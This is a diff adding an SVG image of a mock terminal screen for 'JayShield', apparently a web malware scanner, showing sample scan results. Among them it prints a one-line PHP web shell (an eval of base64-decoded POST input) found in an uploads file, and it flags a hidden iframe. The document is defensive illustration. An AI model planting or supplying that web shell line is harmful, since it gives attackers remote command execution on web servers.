@@ -1,0 +1,40 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="792" viewBox="0 0 1080 792" font-family="ui-monospace, 'SF Mono', 'JetBrains Mono', Menlo, monospace">
+  <defs>
+    <radialGradient id="gTR" cx="82%" cy="2%" r="60%"><stop offset="0%" stop-color="#46f08a" stop-opacity="0.10"/><stop offset="100%" stop-color="#46f08a" stop-opacity="0"/></radialGradient>
+    <radialGradient id="gBL" cx="6%" cy="98%" r="55%"><stop offset="0%" stop-color="#2aa863" stop-opacity="0.09"/><stop offset="100%" stop-color="#2aa863" stop-opacity="0"/></radialGradient>
+    <linearGradient id="termFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#0f1813"/><stop offset="100%" stop-color="#0a100c"/></linearGradient>
+    <filter id="glowTerm" x="-10%" y="-14%" width="120%" height="128%"><feDropShadow dx="0" dy="24" stdDeviation="34" flood-color="#000000" flood-opacity="0.55"/><feDropShadow dx="0" dy="0" stdDeviation="30" flood-color="#46f08a" flood-opacity="0.08"/></filter>
+    <pattern id="grid" width="34" height="34" patternUnits="userSpaceOnUse"><path d="M34 0H0V34" fill="none" stroke="#46f08a" stroke-opacity="0.03" stroke-width="1"/></pattern>
+  </defs>
+
+  <rect width="1080" height="792" fill="#050807"/>
+  <rect width="1080" height="792" fill="url(#grid)"/>
+  <rect width="1080" height="792" fill="url(#gTR)"/>
+  <rect width="1080" height="792" fill="url(#gBL)"/>
+
+  <g filter="url(#glowTerm)"><rect x="40" y="36" width="1000" height="720" rx="18" fill="url(#termFill)" stroke="#46f08a" stroke-opacity="0.32" stroke-width="1.4"/></g>
+  <line x1="40" y1="86" x2="1040" y2="86" stroke="#46f08a" stroke-opacity="0.12" stroke-width="1"/>
+  <circle cx="74" cy="62" r="6.5" fill="#ff5f56"/><circle cx="97" cy="62" r="6.5" fill="#ffbd2e"/><circle cx="120" cy="62" r="6.5" fill="#27c93f"/>
+  <text x="150" y="67" font-size="16" fill="#5f7167">jayshield  —  ~/public_html</text>
+
+  <g font-size="18" xml:space="preserve">
+    <text x="80" y="122" fill="#8effb6">     ██╗ █████╗ ██╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗██████╗ ██████╗  ██████╗</text>
+    <text x="80" y="150" fill="#8effb6">     ██║██╔══██╗╚██╗ ██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔═══██╗</text>
+    <text x="80" y="178" fill="#8effb6">     ██║███████║ ╚████╔╝ ███████║███████║██║     █████╔╝ ██████╔╝██████╔╝██║   ██║</text>
+    <text x="80" y="206" fill="#8effb6">██   ██║██╔══██║  ╚██╔╝  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔═══╝ ██╔══██╗██║   ██║</text>
+    <text x="80" y="234" fill="#8effb6">╚█████╔╝██║  ██║   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║     ██║  ██║╚██████╔╝</text>
+    <text x="80" y="262" fill="#8effb6"> ╚════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝</text>
+    <text x="80" y="318"><tspan fill="#46f08a" font-weight="700">  JayShield®  ·  find and remove web malware</tspan><tspan fill="#66786c">   v1.2.1</tspan></text>
+    <text x="80" y="346" fill="#66786c">  github.com/JayHackPro/JayShield</text>
+    <text x="80" y="402" fill="#66786c">  Scanned 1,284 files (24.6 MB) in 0.9s</text>
+    <text x="80" y="456"><tspan fill="#ff5c5c" font-weight="700">  CRITICAL</tspan><tspan fill="#e7eee8" font-weight="700"> public_html/wp-content/uploads/logo.php</tspan></text>
+    <text x="80" y="484"><tspan fill="#ff5c5c">     ✕</tspan><tspan fill="#9db0a2"> Obfuscated eval of a decoded payload</tspan><tspan fill="#66786c">:1</tspan></text>
+    <text x="80" y="512" fill="#5f7167">       &lt;?php @eval(base64_decode($_POST[&quot;cmd&quot;]));</text>
+    <text x="80" y="566"><tspan fill="#ff9d3c" font-weight="700">  HIGH    </tspan><tspan fill="#e7eee8" font-weight="700"> public_html/index.html</tspan></text>
+    <text x="80" y="594"><tspan fill="#ff9d3c">     ▲</tspan><tspan fill="#9db0a2"> Hidden or zero-size iframe</tspan><tspan fill="#66786c">:42</tspan></text>
+    <text x="80" y="648" fill="#8effb6" font-weight="700">  Summary</text>
+    <text x="80" y="676"><tspan fill="#66786c">  </tspan><tspan fill="#ff5c5c">critical 1</tspan><tspan fill="#66786c">   </tspan><tspan fill="#ff9d3c">high 1</tspan><tspan fill="#66786c">   medium 0   low 0</tspan></text>
+    <text x="80" y="704" fill="#66786c">  2 files infected, 1,282 clean</text>
+    <text x="80" y="734"><tspan fill="#46f08a" font-weight="700">  ✔ Review the findings, then remove them safely with </tspan><tspan fill="#8effb6" font-weight="700">--quarantine</tspan></text>
+  </g>
+</svg>
